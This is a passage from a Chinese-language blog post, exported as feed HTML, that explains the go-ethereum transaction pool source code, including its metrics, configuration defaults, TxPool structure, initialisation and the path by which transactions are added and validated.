class="string">&quot;txpool/pending/nofunds&quot;</span>, <span class="literal">nil</span>)   <span class="comment">// Dropped due to out-of-funds</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Metrics for the queued pool</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//排队池</span></span><br><span class="line">queuedDiscardMeter   = metrics.NewRegisteredMeter(<span class="string">&quot;txpool/queued/discard&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">queuedReplaceMeter   = metrics.NewRegisteredMeter(<span class="string">&quot;txpool/queued/replace&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">queuedRateLimitMeter = metrics.NewRegisteredMeter(<span class="string">&quot;txpool/queued/ratelimit&quot;</span>, <span class="literal">nil</span>) <span class="comment">// Dropped due to rate limiting</span></span><br><span class="line">queuedNofundsMeter   = metrics.NewRegisteredMeter(<span class="string">&quot;txpool/queued/nofunds&quot;</span>, <span class="literal">nil</span>)   <span class="comment">// Dropped due to out-of-funds</span></span><br><span class="line">queuedEvictionMeter  = metrics.NewRegisteredMeter(<span class="string">&quot;txpool/queued/eviction&quot;</span>, <span class="literal">nil</span>)  <span class="comment">// Dropped due to lifetime</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// General tx metrics</span></span><br><span class="line">knownTxMeter       = metrics.NewRegisteredMeter(<span class="string">&quot;txpool/known&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">validTxMeter       = metrics.NewRegisteredMeter(<span class="string">&quot;txpool/valid&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">invalidTxMeter     = metrics.NewRegisteredMeter(<span class="string">&quot;txpool/invalid&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">underpricedTxMeter = metrics.NewRegisteredMeter(<span class="string">&quot;txpool/underpriced&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">overflowedTxMeter  = metrics.NewRegisteredMeter(<span class="string">&quot;txpool/overflowed&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line"><span class="comment">// throttleTxMeter counts how many transactions are rejected due to too-many-changes between</span></span><br><span class="line"><span class="comment">// txpool reorgs.</span></span><br><span class="line">throttleTxMeter = metrics.NewRegisteredMeter(<span class="string">&quot;txpool/throttle&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line"><span class="comment">// reorgDurationTimer measures how long time a txpool reorg takes.</span></span><br><span class="line">reorgDurationTimer = metrics.NewRegisteredTimer(<span class="string">&quot;txpool/reorgtime&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line"><span class="comment">// dropBetweenReorgHistogram counts how many drops we experience between two reorg runs. It is expected</span></span><br><span class="line"><span class="comment">// that this number is pretty low, since txpool reorgs happen very frequently.</span></span><br><span class="line">dropBetweenReorgHistogram = metrics.NewRegisteredHistogram(<span class="string">&quot;txpool/dropbetweenreorg&quot;</span>, <span class="literal">nil</span>, metrics.NewExpDecaySample(<span class="number">1028</span>, <span class="number">0.015</span>))</span><br><span class="line"></span><br><span class="line">pendingGauge = metrics.NewRegisteredGauge(<span class="string">&quot;txpool/pending&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">queuedGauge  = metrics.NewRegisteredGauge(<span class="string">&quot;txpool/queued&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">localGauge   = metrics.NewRegisteredGauge(<span class="string">&quot;txpool/local&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">slotsGauge   = metrics.NewRegisteredGauge(<span class="string">&quot;txpool/slots&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line"></span><br><span class="line">reheapTimer = metrics.NewRegisteredTimer(<span class="string">&quot;txpool/reheap&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><hr><h4 id="交易池配置">交易池配置</h4><blockquote><p>交易池配置不多，但每项配置均直接影响交易池对交易的处理行为。配置信息由 TxPoolConfig 所定义，相关的解释已经在源码中</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TxPoolConfig are the configuration parameters of the transaction pool.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//交易池配置(以太坊 geth 节点允许在启动节点时，通过参数修改以下配置)</span></span><br><span class="line"><span class="keyword">type</span> TxPoolConfig <span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="comment">//定义了一组视为local交易的账户地址。</span></span><br><span class="line"><span class="comment">//任何来自此清单的交易默认均被视为 local 交易</span></span><br><span class="line">Locals    []common.Address <span class="comment">// Addresses that should be treated by default as local</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//是否禁止local交易处理。默认为 fasle,允许 local 交易。</span></span><br><span class="line"><span class="comment">//如果禁止,则来自 local 的交易均视为 remote 交易处理</span></span><br><span class="line">NoLocals  <span class="type">bool</span>             <span class="comment">// Whether local transaction handling should be disabled</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//存储local交易记录的文件名，默认是 ./transactions.rlp</span></span><br><span class="line">Journal   <span class="type">string</span>           <span class="comment">// Journal of local transactions to survive node restarts</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定期将local交易存储文件中的时间间隔。默认为每小时一次</span></span><br><span class="line">Rejournal time.Duration    <span class="comment">// Time interval to regenerate the local transaction journal</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// remote交易进入交易池的最低 Price 要求。此设置对 local 交易无效。默认值1</span></span><br><span class="line">PriceLimit <span class="type">uint64</span> <span class="comment">// Minimum gas price to enforce for acceptance into the pool</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//替换交易时所要求的价格上调涨幅比例最低要求。任何低于要求的替换交易均被拒绝。</span></span><br><span class="line">PriceBump  <span class="type">uint64</span> <span class="comment">// Minimum price bump percentage to replace an already existing transaction (nonce)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//当交易池中可执行交易（是已在等待矿工打包的交易）量超标时，允许每个账户可以保留在交易池最低交易数。默认值是 16 笔。</span></span><br><span class="line">AccountSlots <span class="type">uint64</span> <span class="comment">// Number of executable transaction slots guaranteed per account</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//交易池中所允许的可执行交易量上限，高于上限时将释放部分交易。默认是 4096 笔交易。</span></span><br><span class="line">GlobalSlots  <span class="type">uint64</span> <span class="comment">// Maximum number of executable transaction slots for all accounts</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//交易池中单个账户 非可执行交易 上限，默认是64笔。</span></span><br><span class="line">AccountQueue <span class="type">uint64</span> <span class="comment">// Maximum number of non-executable transaction slots permitted per account</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//交易池中所有非可执行交易上限，默认 1024 笔。</span></span><br><span class="line">GlobalQueue  <span class="type">uint64</span> <span class="comment">// Maximum number of non-executable transaction slots for all accounts</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 允许 remote 的非可执行交易可在交易池存活的最长时间。</span></span><br><span class="line"><span class="comment">//交易池每分钟检查一次，一旦发现有超期的remote 账户，则移除该账户下的所有非可执行交易。默认为3小时。</span></span><br><span class="line">Lifetime time.Duration <span class="comment">// Maximum amount of time non-executable transaction are queued</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上有解释过的默认配置(如: <code>PriceLimit=1</code> <code>PriceBump=10</code>)在下面已经被定义成常量：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> DefaultTxPoolConfig = TxPoolConfig&#123;</span><br><span class="line">Journal:   <span class="string">&quot;transactions.rlp&quot;</span>,</span><br><span class="line">Rejournal: time.Hour,</span><br><span class="line"></span><br><span class="line">PriceLimit: <span class="number">1</span>,</span><br><span class="line">PriceBump:  <span class="number">10</span>,</span><br><span class="line"></span><br><span class="line">AccountSlots: <span class="number">16</span>,</span><br><span class="line">GlobalSlots:  <span class="number">4096</span> + <span class="number">1024</span>, <span class="comment">// urgent + floating queue capacity with 4:1 ratio</span></span><br><span class="line">AccountQueue: <span class="number">64</span>,</span><br><span class="line">GlobalQueue:  <span class="number">1024</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">//默认的remote的生命周期 交易池每隔一分钟检查一次</span></span><br><span class="line">Lifetime: <span class="number">3</span> * time.Hour,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>该结构体被用于<code>Txpool</code>中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TxPool contains all currently known transactions. Transactions</span></span><br><span class="line"><span class="comment">// enter the pool when they are received from the network or submitted</span></span><br><span class="line"><span class="comment">// locally. They exit the pool when they are included in the blockchain.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// The pool separates processable transactions (which can be applied to the</span></span><br><span class="line"><span class="comment">// current state) and future transactions. Transactions move between those</span></span><br><span class="line"><span class="comment">// two states over time as they are received and processed.</span></span><br><span class="line"><span class="keyword">type</span> TxPool <span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="comment">//配置信息</span></span><br><span class="line">config TxPoolConfig</span><br><span class="line"><span class="comment">//链配置</span></span><br><span class="line">chainconfig *params.ChainConfig <span class="comment">//param(中文-&gt;参数)</span></span><br><span class="line"><span class="comment">//当前链</span></span><br><span class="line">chain blockChain</span><br><span class="line"><span class="comment">//最低的gas价格</span></span><br><span class="line">gasPrice *big.Int</span><br><span class="line"><span class="comment">//通过txFedd订阅TxPool的信息</span></span><br><span class="line">txFeed event.Feed</span><br><span class="line"><span class="comment">//提供了同时取消多个订阅的功能</span></span><br><span class="line">scope event.SubscriptionScope</span><br><span class="line"></span><br><span class="line"><span class="comment">//对事物进行签名处理</span></span><br><span class="line">signer types.Signer</span><br><span class="line"><span class="comment">//读写互斥锁</span></span><br><span class="line">mu sync.RWMutex</span><br><span class="line"></span><br><span class="line">istanbul <span class="type">bool</span> <span class="comment">// Fork indicator whether we are in the istanbul stage.</span></span><br><span class="line">eip2718  <span class="type">bool</span> <span class="comment">// Fork indicator whether we are using EIP-2718 type transactions.</span></span><br><span class="line">eip1559  <span class="type">bool</span> <span class="comment">// Fork indicator whether we are using EIP-1559 type transactions.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//区块链头部的当前状态</span></span><br><span class="line">currentState  *state.StateDB <span class="comment">// Current state in the blockchain head</span></span><br><span class="line">pendingNonces *txNoncer      <span class="comment">// Pending state tracking virtual nonces</span></span><br><span class="line">currentMaxGas <span class="type">uint64</span>         <span class="comment">// Current gas limit for transaction caps</span></span><br><span class="line"></span><br><span class="line">locals  *accountSet <span class="comment">// Set of local transaction to exempt from eviction rules</span></span><br><span class="line">journal *txJournal  <span class="comment">// Journal of local transaction to back up to disk</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//可执行队列</span></span><br><span class="line">pending <span class="keyword">map</span>[common.Address]*txList <span class="comment">// All currently processable transactions</span></span><br><span class="line"><span class="comment">//排队队列</span></span><br><span class="line">queue <span class="keyword">map</span>[common.Address]*txList   <span class="comment">// Queued but non-processable transactions</span></span><br><span class="line">    <span class="comment">//每个账户对应的最后一笔交易进入的pending队列的时刻</span></span><br><span class="line">beats <span class="keyword">map</span>[common.Address]time.Time <span class="comment">// Last heartbeat from each known account</span></span><br><span class="line">    <span class="comment">//储存全部的交易</span></span><br><span class="line">all   *txLookup                    <span class="comment">// All transactions to allow lookups</span></span><br><span class="line"><span class="comment">//所有按价格排序的交易</span></span><br><span class="line">priced *txPricedList <span class="comment">// All transactions sorted by price</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//当有了新的区块的产生会收到消息，订阅区块头消息</span></span><br><span class="line">chainHeadCh <span class="keyword">chan</span> ChainHeadEvent</span><br><span class="line"><span class="comment">//区块头消息订阅器</span></span><br><span class="line">chainHeadSub    event.Subscription</span><br><span class="line">reqResetCh      <span class="keyword">chan</span> *txpoolResetRequest</span><br><span class="line">reqPromoteCh    <span class="keyword">chan</span> *accountSet</span><br><span class="line">queueTxEventCh  <span class="keyword">chan</span> *types.Transaction</span><br><span class="line">reorgDoneCh     <span class="keyword">chan</span> <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line">reorgShutdownCh <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;  <span class="comment">// requests shutdown of scheduleReorgLoop</span></span><br><span class="line">wg              sync.WaitGroup <span class="comment">// tracks loop, scheduleReorgLoop</span></span><br><span class="line">initDoneCh      <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;  <span class="comment">// is closed once the pool is initialized (for tests)</span></span><br><span class="line"></span><br><span class="line">changesSinceReorg <span class="type">int</span> <span class="comment">// A counter for how many drops we&#x27;ve performed in-between reorg.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就像上面的交易配置，再结合下面的图像：<br><img src="https://gitee.com/xyjjyyy/myimg/raw/master/img/202203190237870.png" style="zoom: 33%;"></p><p>我们可以发现，以太坊将交易按状态分为两部分：可执行交易和非可执行交易。分别记录在<code>pending</code>容器中和<code> queue</code>容器，交易池先采用一个 <code>txLookup</code> (内部为 map）跟踪所有交易。同时将交易根据本地优先，价格优先原则将交易划分为两部分 <code>queue </code>和 <code>pending</code>。而这两部交易则按账户分别跟踪</p><h4 id="Txpool初始化"><code>Txpool</code>初始化</h4><blockquote><p>**func NewTxPool(config TxPoolConfig, chainconfig *params.ChainConfig, chain blockChain) *TxPool **</p></blockquote><p><big>1. 检查配置，配置有问题的话就用默认配置初始化</big></p><p><code>config = (&amp;config).sanitize()</code></p><hr><p><big>2. 初始化本地账户： </big></p><p><code>pool.locals = newAccountSet(pool.signer)</code></p><p>相关函数为详情为：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newAccountSet</span><span class="params">(signer types.Signer, addrs ...common.Address)</span></span> *accountSet &#123;</span><br><span class="line">as := &amp;accountSet&#123;</span><br><span class="line">accounts: <span class="built_in">make</span>(<span class="keyword">map</span>[common.Address]<span class="keyword">struct</span>&#123;&#125;),</span><br><span class="line">signer:   signer,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//逐个加入地址</span></span><br><span class="line"><span class="keyword">for</span> _, addr := <span class="keyword">range</span> addrs &#123;</span><br><span class="line">as.add(addr)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//返回创建的AccountSet</span></span><br><span class="line"><span class="keyword">return</span> as</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p><big>3. 将配置的本地账户地址加入进去 </big></p><pre><code>pool.locals.add(addr)</code></pre><p>我们在安装以太坊客户端可以指定一个数据存储目录，此目录便会存储着所有我们导入的或者通过本地客户端创建的帐户 keystore 文件。而这个加载过程便是从该目录加载帐户数据</p><hr><p><big> 4. 更新交易池：</big></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//reset检索区块链的当前状态，并确保交易池的内容相对于链状态有效。</span></span><br><span class="line">pool.reset(<span class="literal">nil</span>, chain.CurrentBlock().Header())</span><br></pre></td></tr></table></figure><p>更新交易池使用的<code>reset</code>函数非常关键,我们要进行讲解:</p><p>首先是<code>reset</code>函数的目的是：</p><ul><li><p>对应<code>oldHead=nil</code>的情况时:</p><p>一般发生在刚创建交易池的时候,我们会用<code>chain.CurrentBlock().Header()</code>(就是当前的区块头)来进行替换,说是复制也可以，达到<code>reset</code>函数的目的;</p></li><li><p>对应<code>oldHead!=nil</code>的情况时:<br><strong>发生原因：</strong> 由于以太坊是分布式系统，当本地节点已经挑选出最优的交易，准备广播给整个网络，这个时候矿工已经打包了一个区块，本地节点的区块头就是旧的了，本地筛选的交易有可能已经被打包，如果已经被打包生成了新区块，再将这个交易广播已经没有任何的意义，甚至我们费尽心思准备好的 pending 缓冲区里的交易都是无效的。<br><strong>解决方法：</strong> 为了避免以上的情况发生我们就需要监听链是否有新区块产生，也就是<code>ChainHeadEvent</code>事件(相关调用的函数为<code>runReorg</code>函数)，监听到之后就要回退，现在这里不是我们这讨论的范畴；<br>具体代码就是这样完成的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Subscribe events from blockchain and start the main event loop.</span></span><br><span class="line"><span class="comment">//在交易池启动后，将订阅链的区块头事件</span></span><br><span class="line">pool.chainHeadSub = pool.chain.SubscribeChainHeadEvent(pool.chainHeadCh)</span><br></pre></td></tr></table></figure></li><li><p><code>pool.wg.Add(1)</code>关于这行代码的解释请看 go 语言语法知识<code>go语言等待组</code>那一块，这里不再讲解；</p></li><li><p><code>go pool.scheduleReorgLoop()</code>文件给出的解释是这样的，与后面加载本地日志的操作相呼应 <code> Start the reorg loop early so it can handle requests generated during journal loading.</code></p></li><li><p>如果本地交易开启 那么从本地磁盘加载本地交易:</p></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">// If local transactions and journaling is enabled, load from disk</span></span><br><span class="line"><span class="comment">//允许local交易 并且储存了journal</span></span><br><span class="line"><span class="keyword">if</span> !config.NoLocals &amp;&amp; config.Journal != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line"><span class="comment">//在启动交易池时根据配置开启本地交易存储能力</span></span><br><span class="line"><span class="comment">//主要是从config中读出</span></span><br><span class="line">pool.journal = newTxJournal(config.Journal)</span><br><span class="line"></span><br><span class="line"><span class="comment">//load 从磁盘加载已有交易到交易池中。</span></span><br><span class="line"><span class="keyword">if</span> err := pool.journal.load(pool.AddLocals); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Warn(<span class="string">&quot;Failed to load transaction journal&quot;</span>, <span class="string">&quot;err&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//对 journal 文件执行 rotate，将交易池中的本地交易写入journal文件，并丢弃旧数据。</span></span><br><span class="line"><span class="keyword">if</span> err := pool.journal.rotate(pool.local()); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Warn(<span class="string">&quot;Failed to rotate transaction journal&quot;</span>, <span class="string">&quot;err&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>开启主循环</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//启动事件循环并返回</span></span><br><span class="line">pool.wg.Add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//是txPool的一个goroutine.也是主要的事件循环.（下一个函数）</span></span><br><span class="line"><span class="comment">//等待和响应外部区块链事件以及各种报告和交易驱逐事件</span></span><br><span class="line"><span class="keyword">go</span> pool.loop()</span><br></pre></td></tr></table></figure><p><strong>到此初始化结束</strong></p><hr><h4 id="添加交易到交易池">添加交易到交易池</h4><blockquote><p>交易池中交易的来源一方面是其他节点广播过来的，一方面是本地提交的，追根到源代码一个是<code>AddLocal()</code>，一个是<code>AddRemote()</code>,不管哪个都会调用<code>addTxs()</code>。所以我们对添加交易的讨论就会从这个函数开始，然后逐步引出全局</p></blockquote><p>先看下面这一张图简要说明一下操作的流程：</p><img src="https://gitee.com/xyjjyyy/myimg/raw/master/img/202203190237304.png" style="zoom:33%;" align=left ><hr><ol><li>首先是遍历整个<code>交易map(txs)</code>，将其中已经存在的和无效签名的交易过滤出去，注意同时其中要进行相关数据的记录</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i, tx := <span class="keyword">range</span> txs &#123;</span><br><span class="line"><span class="comment">// If the transaction is known, pre-set the error slot</span></span><br><span class="line"><span class="comment">//使用的Get()很简单就不多言</span></span><br><span class="line"><span class="keyword">if</span> pool.all.Get(tx.Hash()) != <span class="literal">nil</span> &#123;</span><br><span class="line">errs[i] = ErrAlreadyKnown</span><br><span class="line">knownTxMeter.Mark(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Exclude transactions with invalid signatures as soon as</span></span><br><span class="line"><span class="comment">// possible and cache senders in transactions before</span></span><br><span class="line"><span class="comment">// obtaining lock</span></span><br><span class="line">_, err := types.Sender(pool.signer, tx)</span><br><span class="line"><span class="comment">//错误签名</span></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">errs[i] = ErrInvalidSender</span><br><span class="line">invalidTxMeter.Mark(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Accumulate all unknown transactions for deeper processing</span></span><br><span class="line">news = <span class="built_in">append</span>(news, tx)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//如果排查完之后news里面没有交易</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(news) == <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> errs</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><ol start="2"><li>将交易进行添加的操作：</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//上锁防止冲突</span></span><br><span class="line">pool.mu.Lock()</span><br><span class="line">newErrs, dirtyAddrs := pool.addTxsLocked(news, local)</span><br><span class="line">pool.mu.Unlock()</span><br></pre></td></tr></table></figure><p>于是乎我们就必须进入<code>addTxsLocked()</code>函数中去了解其进行的操作，代码不长，于是全部放在下面：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// addTxsLocked attempts to queue a batch of transactions if they are valid.</span></span><br><span class="line"><span class="comment">// The transaction pool lock must be held.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(pool *TxPool)</span></span> addTxsLocked(txs []*types.Transaction, local <span class="type">bool</span>) ([]<span class="type">error</span>, *accountSet) &#123;</span><br><span class="line">dirty := newAccountSet(pool.signer)</span><br><span class="line">errs := <span class="built_in">make</span>([]<span class="type">error</span>, <span class="built_in">len</span>(txs))</span><br><span class="line"><span class="keyword">for</span> i, tx := <span class="keyword">range</span> txs &#123;</span><br><span class="line">replaced, err := pool.add(tx, local)</span><br><span class="line">errs[i] = err</span><br><span class="line"><span class="comment">//加入交易池成功并且没有替换老交易</span></span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &amp;&amp; !replaced &#123;</span><br><span class="line">dirty.addTx(tx)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">validTxMeter.Mark(<span class="type">int64</span>(<span class="built_in">len</span>(dirty.accounts)))</span><br><span class="line"><span class="keyword">return</span> errs, dirty</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们发现除了一些初始化和计数器的操作，还有一个至关重要的<code>add()</code>函数，它是将交易添加到<code>queue</code>中，等待后面的<code>promote</code>，到<code>pending</code>中去。如果在<code>queue</code>或者<code>pending</code>中已经存在，并且它的``gas price`更高时，将覆盖之前的交易。我们来了解一下该函数的具体操作步骤：</p><blockquote><p>以下按照源码顺序编写，所以不贴源码了，请对照源码观看</p></blockquote><ol><li><p>过滤交易池中已有的交易，记住是通过<code>hash值</code>进行的判断,因为即便两笔交易<code>nonce</code>值一样，<code>hash</code>值也断然不会相同;</p></li><li><p>判断<code>local</code>标记，并进行共识性验证<code>validateTx()</code></p><p>validateTx: 主要做了以下几件事<br>[ ]交易大小不能超过 32kb</p><ul><li>交易金额不能为负</li><li>交易 gas 值不能超出当前交易池设定的 gaslimit</li><li>交易签名必须正确</li><li>如果交易为远程交易，则需验证其 gasprice 是否小于交易池 gasprice 最小值，如果是本地，优先打包，不管 gasprice</li><li>判断当前交易 nonce 值是否过低</li><li>交易所需花费的转帐手续费是否大于帐户余额 cost == V + GP * GL</li><li>判断交易花费 gas 是否小于其预估花费 gas</li></ul></li><li><p>如果交易池已满，丢弃价格过低的交易，注意这边的<code>GlobalSlots</code>和<code>GlobalQueue</code> ，就是我们说的<code>pending</code>和<code>queue</code>的最大容量，如果交易池的交易数超过两者之和，就要丢弃价格过低的交易。</p></li><li><p>进入一个重要的<code>if</code>语句进行判断：</p><ul><li>判断当前交易在<code>pending</code>队列中是否存在<code>nonce值</code>相同的交易。存在则判断当前交易所设置的<code>gasprice</code>是否超过设置的<code>PriceBump(为10)</code>百分比，超过则替换覆盖已存在的交易<code>old==nil</code>和<code>nil</code>，否则报错返回<code>false</code>和错误信息替换交易<code>gasprice</code>过低;无论如何返回，该函数都已经在此处退出。</li><li>不存在的话就把它扔到<code>queue</code>队列中(通过<code>enqueueTx()</code>函数)。</li></ul></li><li><p>对该笔交易进行一些<code>local</code>的操作。</p></li><li><p>交易晋升</p><blockquote><p>接着我们还是回到<code>addTxs()</code>这个函数中来，我们发现我们又是遇上一个极为重要的函数 <code>requestPromoteExecutables()</code>,下面进行相关的剖析：</p></blockquote></li></ol>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;blockquote&gt;
